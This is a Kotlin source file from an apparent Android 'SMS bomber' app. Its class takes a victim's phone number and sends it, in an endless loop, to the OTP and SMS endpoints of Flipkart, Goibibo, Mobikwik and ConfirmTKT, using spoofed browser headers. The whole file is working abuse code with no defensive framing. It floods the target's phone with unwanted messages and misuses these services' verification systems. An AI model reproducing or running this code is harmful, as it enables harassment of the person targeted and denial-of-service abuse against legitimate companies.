package co.deucate.smsbomber.core

import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.util.HashMap

class Bombs(private val mPhoneNumber: String) {

    var listner: OnCallBack? = null

    fun flipkart() {
        val localOkHttpClient = OkHttpClient()
        val localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91$mPhoneNumber")
        localOkHttpClient.newCall(Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                listner!!.onFailListner("Flipkart ${paramAnonymousIOException.localizedMessage}")
                goibibo()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                listner!!.onSuccessListner("Flipkart ${paramAnonymousResponse.message()}")
                goibibo()
            }
        })

    }

    private fun goibibo() {
        val localOkHttpClient3 = OkHttpClient()
        val localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=$mPhoneNumber")
        localOkHttpClient3.newCall(Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                listner!!.onFailListner("Goibibo ${paramAnonymousIOException.localizedMessage}")
                mobikwick()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                listner!!.onSuccessListner("Goibibo ${paramAnonymousResponse.message()}")
                mobikwick()
            }
        })
    }

    private fun mobikwick() {
        val localMediaType001 = MediaType.parse("application/json; charset=utf-8")
        val localHashMap001 = HashMap<String, Any>()
        localHashMap001["cell"] = mPhoneNumber
        val localJSONObject001 = JSONObject(localHashMap001)
        val localOkHttpClient001 = OkHttpClient()
        val localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString())
        localOkHttpClient001.newCall(Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                listner!!.onFailListner("Mobikwik ${paramAnonymousIOException.localizedMessage}")
                confirmTKT()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                listner!!.onSuccessListner("Mobikwik ${paramAnonymousResponse.message()}")
                confirmTKT()
            }
        })
    }

    private fun confirmTKT() {
        val client = OkHttpClient()
        val request = Request.Builder().url("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=$mPhoneNumber").build()
        val call = client.newCall(request)
        call.enqueue(object : Callback {
            override fun onFailure(call: Call?, e: IOException?) {
                listner!!.onFailListner("ConfirmTKT ${e!!.localizedMessage}")
                flipkart()
            }

            override fun onResponse(call: Call?, response: Response?) {
                listner!!.onSuccessListner("ConfirmTKT ${response!!.message()}")
                flipkart()
            }
        })

    }

    interface OnCallBack {
        fun onFailListner(err: String)
        fun onSuccessListner(res: String)
    }

}